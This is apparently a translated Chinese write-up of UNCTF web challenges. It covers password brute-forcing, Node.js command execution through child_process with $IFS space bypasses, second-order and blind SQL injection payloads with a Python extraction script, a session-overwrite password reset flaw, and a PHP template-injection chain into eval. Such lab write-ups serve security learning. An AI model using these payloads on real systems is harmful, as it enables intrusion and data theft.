# UNCTF Write Up
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## WEB
###  帮赵总征婚
呃，帮不了赵总征婚~。
f12，有个hint：
上rockyou字典（不可能的，bp会炸，上top3000），直接爆，得到flag
得到flag：flag{57fc636a42f46c7658110a631256f5cb}
###  简单的备忘录
emmm，没学过的语言，进去各种fuzz，
发现打一个字母他就会给些选择
最后随缘整出flag
flag{3ad4aaedf408c147d5f747f7ce76d2b4}
###  checkin
进入是个聊天框，/name 改名字
/flag 会打印flag1flag1flag1….
/more 显示/flag – 小伙子…
/calc 可以计算，（猜测这里可能有命令执行）
找到篇文章https://m.jb51.net/article/91411.htm`
于是试了试里面的payload：/calc require(‘child_process’).exec(‘ls’).toString()
返回了：血小板: [object Object]
然后试了试execSync：/calc require(‘child_process’).execSync(‘ls’).toString()
返回了：bin games include lib local sbin share src命令执行成功
于是读取flag：/calc require(‘child_process’).execSync(‘cat /flag’).toString()
返回：血小板: undefined
应该是空格的问题，那就用$IFS替代：/calc
require(‘child_process’).execSync(‘cat$IFS/flag’).toString()
成功拿到flag
flag{0e4d1980ef6f8a81428f83e8e1c6e22b}
###  Twice_Insert
刚开始还以为是原题，注册admin’#后改密码，然后用admin登录，发现并没有flag（可恶呢
但是，既然这个二次注入点还在，那仍然是可以被拿来利用的
在单引号和#中间就可以注入语句
各种fuzz后，发现很多函数都被waf了（smarter…harder…大概是有回显的盲注了）
最后，发现了这篇文章https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/
于是试着构造payload：
    "admin' and ascii(substr((select group_concat(distinct database_name)from mysql.innodb_index_stats),1,1))=30###vanish"
    "admin' and ascii(substr((select group_concat(distinct table_name)from mysql.innodb_index_stats),1,1))=30###vanish"
然后写一个自动化脚本。不断地注册，登录，改密码，然后根据回显按位爆破库、表即可
最终的payload：”admin’ and ascii(substr((select * from
fl4g),%d,1))=%d###vanish”%(i,j)
得到flag：UNCTF{585ae8df50433972bb6ebd76e3ebd9f4}（不知道为啥，开头有时候会缺）
###  NSB Reset Password
注册->改密码：发验证码->重置密码
三个包抓过来，发现sessionID都没有变动过。
试着猜想这个改密码的逻辑：当我给自己的账户发邮件，然后输入验证码，验证通过后，这个sessionID就获得了更改密码的权利，但是是更改谁的密码呢？账户的信息想必是存在sessionID里的。
但经过测验，无论是给admin发邮件，还是给自己发邮件，sessionID都没有变过。那么，显然sessionID里的储存的账户信息的那部分是可以被覆盖的，所以解题流程：
先注册->更改密码：发送验证码->到重置密码的界面，此时再开一个窗口，发送更改admin密码的邮件（sessionID里的用户被覆盖为admin），然后又回去，更改密码（此时更改的就是sessionID里的账户，即admin的密码），然后用自己更改的密码登录admin账户即可获flag
flag：flag{175f3098f80735ddfdfbd4588f6b1082}
###  easy_admin
很容易发现在/index.php?file=forget这里存在注入
fuzz后发现过滤了and select where。。。
然后卡了好久不知道怎么查admin的密码，最后索性直接 password （bugku有一道过滤很严的题就是这样bypass，）
exp：
    import requests
    url = "http://101.71.29.5:10045/index.php?file=forget"
    r = requests.Session()
    password=""
    for i in range(1,40):
        for j in range(ord('0'),ord('}')):
            data = {
                "username":"-1'or ascii(substr((password),%d,1))=%d#"%(i,j)
            }
            res = r.post(url, data=data)
            #print res.text
            if "ok reset password" in res.text:
                password = password + chr(j)
                print password
                break
得到密码：
登录后yes you are admin, but you can’ to get the flag, because admin will access
the website from
from where？
盲猜是127.0.0.1，然后再报文头加一个Referer，得到后一半flag
flag：flag{nevertoolatetox}
###  Bypass
php的正则有点小漏洞，两个斜杠丢进php只剩一个斜杠了，然后这个斜杠丢进正则就用来转义了
而这一题，出题人似乎是给了个hint
这里故意换了下位置。
所以自己做了下实验，发现，由于这个小漏洞，a被过滤了|*而不是*，b被过滤了|\n，而不是被过滤了\n
    ";
    echo $b;
同时，a,b就都可以用斜杠了，
于是就可以闭合引号后任意命令执行
对于命令的过滤有两种绕过方法，一个是linux下，用通配符?绕过，比如var写成v?r
解题：
  1. http://101.71.29.5:10054/?a=\&b=%0al\s%20/%0a
  2. flag不在根目录下，那就找找，
  * http://101.71.29.5:10054/?a=\&b=%0afin\d%20/va?/???/htm?/%0a
  3. 找到了
  * http://101.71.29.5:10054/?a=\&b=%0aca\t%20/va?/???/htm?/.F1jh_/h3R3_1S_your_F1A9.txt%0a
flag：unctf{86dfe85d7c5842c5c04adae104193ee1}
###  审计一下世界上最好的语言吧
先丢进Seay
parse_template.php中有一个eval
查一下调用关系：
    index.php：parse_again($searchword);
    parse_template.php:
    function parse_again(){
        global $template_html,$searchword;
        $searchnum    = isset($GLOBALS['searchnum'])?$GLOBALS['searchnum']:"";
        $type      = isset($GLOBALS['type'])?$GLOBALS['type']:"";
        $typename = isset($GLOBALS['typename'])?$GLOBALS['typename']:"";
        $searchword = substr(RemoveXSS($searchword),0,20);
        $searchnum = substr(RemoveXSS($searchnum),0,20);
        $type = substr(RemoveXSS($type),0,20);
        $typename = substr(RemoveXSS($typename),0,20);
        $template_html = str_replace("{haha:searchword}",$searchword,$template_html);
        $template_html = str_replace("{haha:searchnum}",$searchnum,$template_html);
        $template_html = str_replace("{haha:type}",$type,$template_html);
        $template_html = str_replace("{haha:typename}",$typename,$template_html);
        $template_html = parseIf($template_html);
        return $template_html;
    }
    function parseIf($content){
        if (strpos($content,'{if:')=== false){
                return $content;
        }else{
            $Rule = "/{if:(.*?)}(.*?){end if}/is";
            preg_match_all($Rule,$content,$iar);
            $arlen=count($iar[0]);
            $elseIfFlag=false;
            for($m=0;$m {haha:searchword}  共有{haha:searchnum}个影片 第{searchlist:page}页
最后再看看RemoveXSS
发现 if:,
解题思路：
首先利用四次的strreplace绕过RemoveXss,控制$templatehtml
然后是绕过判断和正则：{if:开头、{end if}结尾，然后真正执行的命令要在rule匹配到的第一个（.*?）
破题：
    $searchnum={end if}
    $searchword={if{haha:type}
    $type=:read{haha:typename}
    $typename=file(%27flag.php%27)}
这样content被替换为
     {if:readfile(%27flag.php%27)} 共有{end if}个影片 第{searchlist:page}页
正则过后$iar为
    Array
    (
        [0] => Array
            (
                [0] => {if:readfile(%27flag.php%27)} 共有{end if}
            )
        [1] => Array
            (
                [0] => readfile(%27flag.php%27)
            )
        [2] => Array
            (
                [0] =>  共有
            )
    )
然后$strIf被赋值为readfile(%27flag.php%27)
然后 @eval(“if(readfile(%27flag.php%27)) { $ifFlag=true;} else{
$ifFlag=false;}”);
readlfile输出flag